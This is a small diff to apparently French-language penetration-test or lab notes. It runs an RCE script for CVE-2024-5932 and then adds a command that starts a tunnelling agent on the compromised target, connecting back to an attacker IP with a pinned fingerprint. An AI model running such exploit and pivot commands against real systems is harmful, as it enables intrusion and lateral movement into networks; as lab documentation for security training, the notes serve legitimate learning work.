@@ -18,6 +18,10 @@ python3 CVE-2024-5932-rce.py \
 ![[IMG-20260115194320820.png]]
 
 Machine Cible:
+```
+./agent -connect 10.10.16.33:11601 -accept-fingerprint 64E58D21BCF29BC9CCDDF20562AEE96877EFF5D6A87AD37B75A03B118CBF0175
+```
+
 ![[IMG-20260115194345293.png]]
 
 Machine atttaquante:
